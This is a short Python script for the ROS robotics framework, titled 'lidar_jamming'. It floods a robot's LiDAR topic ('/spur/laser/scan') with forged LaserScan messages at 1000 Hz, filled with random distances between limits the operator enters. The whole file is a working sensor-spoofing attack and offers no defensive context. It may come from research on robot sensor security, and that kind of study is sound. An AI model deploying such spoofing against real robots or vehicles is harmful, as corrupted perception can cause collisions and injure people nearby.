#!/usr/bin/env python3
import rospy
from sensor_msgs.msg import LaserScan
import random
import time

laser = LaserScan()

scan_pub = rospy.Publisher('/spur/laser/scan', LaserScan, queue_size = 10)
rospy.init_node('lidar_jamming')
rate = rospy.Rate(1000)

a = input("Please enter the lower limit to be used for the jamming: ")
b = input("Please enter the upper limit to be used for the jamming: ")

print(a, b)
print("Execution of the LiDAR jamming is active. ")
distance = random.uniform(float(a), float(b))
rays = random.randint(int(1), int(1024))
thistuple = ()
y = list(thistuple)
n = 0

def jamming():
    global a,b,n, distance, thistuple, y, rays
    
    if n == 0:
        distance = random.uniform(float(a), float(b))
        rays = random.randint(int(1), int(1024))
        time.sleep(2)

    n = n + 1

    thistuple = ()
    y = list(thistuple)
    
    for x in range(rays):
        y.append(distance)
    thistuple = tuple(y)

    laser.ranges = thistuple
    scan_pub.publish(laser)

    if n == 100:
        n = 0

try:
    while not rospy.is_shutdown():
        jamming()
        rate.sleep()
except KeyboardInterrupt:
    pass
    print("\nJamming of the LiDAR Sensor has stopped.")